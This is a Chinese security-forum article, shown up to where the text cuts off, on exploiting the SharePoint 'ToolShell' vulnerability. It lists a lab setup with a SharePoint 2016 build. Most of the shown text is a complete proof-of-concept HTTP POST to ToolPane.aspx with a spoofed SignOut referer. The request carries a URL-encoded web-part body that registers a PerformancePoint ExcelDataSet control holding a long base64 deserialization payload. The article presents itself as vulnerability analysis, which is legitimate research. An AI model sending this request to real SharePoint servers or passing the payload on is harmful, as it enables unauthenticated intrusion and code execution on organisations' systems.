---
title: SharePoint漏洞利用路径的红队化拆解
url: https://forum.butian.net/share/4752
source: 奇安信攻防社区
date: 2026-02-06
fetch_date: 2026-02-07T04:07:27.630992
---

# SharePoint漏洞利用路径的红队化拆解

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### SharePoint漏洞利用路径的红队化拆解

* [漏洞分析](https://forum.butian.net/topic/48)

sharepoint-toolshell

0x00 环境搭建
---------
<https://www.alibabacloud.com/help/tc/ecs/use-cases/install-sharepoint-2016>
WindowsServer 2016
sharepoint 16.0.10337.12109
0x01 漏洞复现
---------
### Poc
```http
POST /\_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: 192.168.0.104:44946
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Referer: /\_layouts/SignOut.aspx
Content-Type: application/x-www-form-urlencoded
Content-Length: 7003
MSOTlPn\_Uri=http%3a//192.168.0.104%3a44946/\_controltemplates/15/AclEditor.ascx&MSOTlPn\_DWP=%3c%25%40%20Register%20Tagprefix%3d%22iabkxcni%22%20Namespace%3d%22System.Web.UI%22%20Assembly%3d%22System.Web.Extensions%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d31bf3856ad364e35%22%20%25%3e%0a%3c%25%40%20Register%20Tagprefix%3d%22obsajjosoict%22%20Namespace%3d%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3d%22Microsoft.PerformancePoint.Scorecards.Client%2c%20Version%3d16.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d71e9bce111e9429c%22%20%25%3e%0a%20%20%3ciabkxcni%3aUpdateProgress%3e%0a%20%20%20%20%3cProgressTemplate%3e%0a%20%20%20%20%20%20%3cobsajjosoict%3aExcelDataSet%20CompressedDataTable%3d%22H4sIANvgkmgAA9Va23LjSHKdscMb9qzf/AMKPU%2b3AFLsGXWoO4IgWRDZIiSARIHAxkQsbi2QBEAO7%2bLv%2bAv9BfbJLPDSt%2bmZWe%2bsrQ5RbBaqMvPkyVNZAL/59ptvvvlv/NBf%2bvn3f8KLNXhertLiZTtchd9fyHSxHM/KN9cvNfr3/UVrna/Wi/RNma5XizD//uJxHeXj%2bF36PJxN0/JN9MMPYSNuvNJv6tep9uPNv9Di/3G2Jr8M0hXZ%2brdRkQ/iLC3CP%2bNde/z%2bvbkIi2%2b/pbE//TNe/utfb3fL10u%2b5GJX5OXyzeWlevN6h/fZajV/fXW13W5fbusvZ4unq5qm6Vej/r1a9nBtsUxg9c3lelFWqy1fFON4MVvO3q9exLPiNa57oa66vBgnby6X4/KpzMbZfD2P8mRTXr797uKCnEnztEjL1UUZFulnLrtQi7zuLqs431yuFuv0%2bLm7TFvrxQIr3M/iME%2brYVqdfsgC3Jnn6W74PE8PHx%2bHstk4Ti%2bKcfkQx%2bsFENCwcrg7/G9dRrN1maTJ5fnMw%2bwPXd8k78dRMs/2s1k0fz9efzLlK/58fNky/XmdlvEXr/m8F6uijMbrOFmX6%2bQIEkFH5t5cVsRpzfI8jVdg4vKlmZbpYhy/vB8vV3/V//KXc24N0sUGAC1fdstVuijD/GVnNw8JEG8Rzufp4q%2b14wQvjV663Zf3s6WYLYpwhQnfX5zGfg/3tfr7xvsf3ut60tDCevjT90db4zKZbZfKyYdogljo7eNithknZPdxkS4BSkghCtRAup0tpr/Dhboeva//2HgVJvVX12m98dNPx5g%2bAOh/obJ/%2bunyYsVJQlLD8pkSdvkhNa%2b%2byJerrxCGL/gF4vF4xaQPiuTqWCXHkvrMUh9OV96wLLz97k8kPv8pbhOo0dPitfoTFr9LSNQctcTX5hwMvdjoVSXefiwup0BvPy7ei8pdkq5hGOUnwVnMtg8LcIyloroqC5etLCyfUmRpXC7TxeoTxbg9L8yj4o6/LrkvsOAqRFpPOp38CqH%2blAS3H5Xuw/vzUv20iP4AJy8%2bz%2bejpx3FqC/Q/haektNpgjcIaPWsfVkrb/vpKpslFqTgbRvasBiH%2bXif3l6dff61yY8hKQnAWv6SJuPyqnr/CASx%2bOuDaiSvl6sFOH759mrbed62tGbTbjabj1f4%2bdFoHn%2b2LXodSKsR1508GmyfZCGf41q%2biSaadj9prvut6%2b19y2gn3k5LRr380Wvkych59r3tsisM3S92c19b5al0NmFNrh%2b9bt2qdXR/79b6w%2bneMt3tQ3sq2H7XNtx6vk9MubqfWpvI3OV%2b3ZlHtcb%2bfprkEWyHXn/t1m6ecc3UrUnNb4vI0w/%2bNYbJXW8eFfGya%2bp7H9dFZj6Gf14w6u1D72b9OLSVz5Pmstux9OjO0ePCvcHaOuZmUWv75N7JMeZNBjXZkObNIvCub/xJXPeHcmIN/d3DsK8Fw%2bb1A6YosGQ7qst10szaUU3f%2bsAhfkqONg031wJP3zeb/abxNLaaRzwbuH63DDxLo%2bvi58ZdAPziIp9w/CMjw/s94j%2btWzR3nr4apiMLa2prt%2b4Ak0aJGFdxzdrEhPf475UnTLGfmBPNJ3qZts/ed%2bjVQIzNZuv/eYwcyv2odu7fdbubH2PqBN4uD2pCC6RFsWTgyyt/xFztIt5pMOr2DOK00emcMPJNes2y7cZ/NrZRPcnj0pphrWW3pYuosDYBeG3XblaRJ9ZBy3hnu7257SbC9qy6XewMR%2bTGcCpasiO6rismgdbb2m6s2XJet73EcNqGMXCFEbrCtF3hJFpvZLtS2NJy7GlgOPXECDqiFU6F8DXx6LpdHes7thR1e2oZzjAzpC5aXkd0HFeMYf9n23UsjJd2cWM4xcoYeklLTkUn1MTQdXt723U12204djE3nI5uSIzHmriDHzLROjvYl7bMHTvPDEfmhl8kLfh31%2b%2bw/Zqy36vbJezXbgxvlLQsVwisH8L/e9sNHKxv2FPYd3XDx/p9rJ9oQsJ%2bB%2bv3EB/8y%2bFfYrg0PhV3Q/gPfAZYf2LLwLBLh%2b1T/D7wCTThBloX/gcLjNd5feAjXcZXRJrwEP8S46UtndIeAV9gIMvEgO2u5Ph6uAZjngC%2bc/ZP5sKIgS/yQ/7VeFzmdXsE/4aOEUjg32H7Dn7r8B/2LcS3An7S8OB/AvueKyzYR%2byBxfFNAmVfE62BJjrAd4T4Ap5/sO9ZRgD/I4X/GPYXsI/8Jwp/XRg%2b%2bAPfTOAzxPydmi/V/JplSCkoPsrvAPOHsB9w/okfU/CP8Dnlf8f4uTrmN4CvMEC3ltXh/GWB1tkyP4hfpQF8EF%2bZtAbAB%2bs4Cn/KP%2bG/MgbgjyeZfwL8oPxj7Rhr3Dh2qfB3wQ9bEyb4OYJ9n%2bd7KLcc%2bHZyjh/5N2HfSzj/8TXwq9t5D%2bPwr36yj/nrI/7lnPND60fgDzhM%2bCj7sgf8JfBdGS7wHwIf5J/iF8DX4PrLA%2bY/4WthPjAeqPrLEB%2buIX57NzzuK/7nNtcP44f5FuIXlH8jdUUH86dYf3Dk3yH/wCHtiDvEF8C/HuLf256D/ErO/1Dn/Jv4pfpHfAnx27FHc1X/4BfmUv17wB/Yyjrjh9pm/mN%2bDH3xVf2NVPyBil/Tuf6BTRf8DBR/EBt4b091rl/Kf9/l/ME%2b5T%2bbcPxT1J%2bbGy7ih30T6yN%2b4j/lP1H8r%2bqP9Ecq/Vmo%2bKWyDx8RP9V/d6jwv%2bP6J/7liG9vcP7BX8o/6ofiS%2brID8YT5m9gJlR/VD8UP/HXUPybGwMT/BeC8Of5WD/D/A3mK/0YGga433I05gf0oyfZvicM5j/45%2baMn4iVfrz6Jf6f%2bEf62%2bP687B%2bVf85xrEHyAnHV%2bZcv8z/U/31jvpL%2bNfVfNJf4h/8Q/06kvVnivoHR3xln/QT/pM%2bJ9aBf4Q/6Y9U%2bCP3FH8w4f1jIoCfpPwb0GfSP9IfjfH1UB/EH9LfWsL6U/Ef/M6gH3nJ8QtpSOAPHyn/hF%2bN9zfCfyhU/kfMfxPxPyA%2b0tce868UKv7yA/5tlX6hfnOD80f6NFT6Q/xvKf2n/c/5jP6IhtJ/4l%2blfzW2T/hDvxh/h/ldIL9arvgHfMBdF/g8H/WH4pfAR57wh/2Nij8p2T7W9zHuagf%2bEf8Doexb7D/hDx2g/JD98Mh/0j/YJ/ypvlyOn/xHfj3sEwXyW1i8fxL/EhV/m/dP5r/afwgf2v98VR/EfzWf6gP1U9k3q/gXzD%2bKb9Jj%2b/Cf7WOdQOkv2Ucclf0h%2bJ9gfbX/dIkfJcdP%2boP6CYTaPzBfBozPh/u/C/3B3IP%2beNx/sP3gmH/sgdT/uEo/5UbhL471H1f1nzD/M4P5R/svapvsQ4NIf8dV/JuD/QHxs8b7O%2bnnJFH4T7j%2byT646Y8Y/wP/9r%2bgP1S/4IeD%2bbQ/Ab999tX6r%2bIn%2b5nqv0i/heI/9J/6h7P67yh8oWHUH6L%2bUF8H/7H/Eb8yyfVD8eecvxZsV/rVJf72FH8E7z/M/ynnn/z/PP86XP%2bkb8i/DJD/kvOPOqT9ra/899yP9Rf8o3HvlP8623f10gY3jvZP9Wep/Y3yr%2brfR39F%2blP1Py7HT/sf64/qf%2bD/Gf8pflxD/Mf%2bRfij/6T6o/39WuW/6v/IPsaxf6P5EYi91%2bf6of770H8q/O/8I/7UX8/rh/6P9j/0D6ZU/Rft/5uj/por5h/6b65/V/EvYP3l/kewflP90XzFP9I/zKf4KX857z/dU/0Fav%2bh%2bA/4T7n/yxLtHH%2bH%2byvyP1L1S/43qv6jpP6d%2bV8c%2b0/i/0zxX6r%2b/7P6m1ncfxa6ih/8PeyfGP9Z4Y/5vP/k3L8j/jtL1d/%2bvP4HON%2bQ/qB/pvoeV/23xfjT/qHnvP%2bhfjj/uKbB%2bxf3PxbHT/7H7rH/36v%2bA/VL9qn/MdX5I1T1TfgEqv4QP/Zv9D/EP5pf9V/An/rPicH8ofiBP%2bl/hT/pD/YfOn8o/Kn%2b7iTnV1yf9L/af9E/uqq/shS/Plv/vL/A/w73H55TV/qr%2bi/0n13q/2A/qPQH%2biLUfGjcgyvaA9VD4vxkORw/9IHyT%2bcf7A%2bEf1DVJ/ZPwl%2bq81m1f8F/rNsBvojNzdX%2bZeJ81lHnB6zvAr8u808i/%2bPq/IJx1JF46GCLcnsP6E%2buuX89G8cZ9rA/D9U4etCzcer/Je/PVN9S8ec0Tv1vB/wD9tx/YZzyL1ifqf4wl%2bbTuKXqk84/BuMv1fnZTFT%2b61X8JfX/A2DnVfEnnB%2bhH8/f0L8BtHUA/YP/BvTtnepPE9VflWp/8nLub0k/8gpfyfNP5/MWOELnL9LXV%2bp8gPpEf2nv1fkjUfUxRfzgf4b6xlih8B/WmH/Ef9IHTZ1/cb6m84uO/qNgfab1pzbXdxUf%2bhcb2jqg/hv8dlR9Y30n4PM16QPi92vJgR/YfwX8px4e50%2bcfY7xwT/kN1T1Wd0/oPjhP/ErUvNhH/uCa2N%2bDv/BX/SotH%2blqr5DxA//%2b9ph/yJ8Md9IVP7GSj/o/Eb9t8Hrk37jmg7wfwy4P6D%2bBvENK/wwHqn7I1LpH%2bEHfhK/UR84Oxuh6s/I/ml92j9J3zy%2b/3DwD/mx6AyNHnBl2LrSZ4pvqPCv8j9X5xvs73R/A/jfKf/JPurHQ3yUf8RP%2bGG8rc5H1P/Gmsrv7oCfgb6OxsFt0l/wg/Qd88/sd6v8Vvd/cqVPtRX390m1f6r7M/CP8B853J9SfknfkD%2b6f9Sq9LPCl/0n%2bwf%2b1Lh/sv07vo9Vs1ZB0xb09jfeD%2bN7ha0OrjdlibHcqOl5YmaboN28izyphebNtG/32829cbz355hyifNqlphyGIx6c9/bzdNC8L3EgXmzDEz5/E47rel4DS0up5vjfeS8lwfF4T7y9XroyZVfyOeB1ygi/Yu%2b/q3ze%2bom6bTHMdsz%2btPhz9p/c2ycB%2bPOacSm2/VH1j7w9HF0NzUTUzwHNal1SieLiyRPBF0jjbhu5ZHXW6Z2Q/NHvTIYOW46MvJhIVaBPV/h/7Oo5jz4np63vU/sGU27i99Ouy9%2bU74XZ/GJqHSeU9u/J9%2bXzd4Jg1Ku/Vpz/4%2b833sv/m/Ydsw8C2qNDTCe%2b/X%2b2r3rbfya3MfP26cjH/%2bezzKetsSs%2b2hkTaJ6bxl6XcQS0D1q4v6NpWzB5vbJrstlciefg6G%2bDkZSiwuxhG924tE86z4Y5W5UW%2bXRRB9b%2bySzvL5uTTqN/t7J%2b%2b2nRuvJt/6gZ0tmm%2b69G/Ov47z1H7m2pEV1orWcpqpbuo/fujlxpJAFamSSmPB13LCo/pCTXlQEG7dGz6jEMhzNMx6fZpvIdPL4Kea1VM3tTjXpNrLIc3t2bZfhM67BlrTm8C9jfO35MPSSNWqLcvvcmuo0L49zrn/bQdysHRpqvy5XAdXstkP1ajSb/W779ByGa97TcSDasjZZSpuu6Y/Jgt5u/AouGkPSmaSVfa5mPvnsne1LWvrxbK8APmVU3IDP%2bSR%2bbthxcTMJoGNdoXB/Jz7zPO/Tz%2bZKY2dGSz1/UnHw%2b%2bT4LKllc7AmP3hp6p/4Z2Q8bwE91/r77hM9e4lJRwe/Or6QFuif4utFpb3vj42jD781nrMHRqZJ7t%2bJo92Df%2bHI2kT/8Odk0z5z6Kn667DPPZWD2f3tVfV4%2bxeel1/9%2bgfmt%2bqbB93q8ffZ...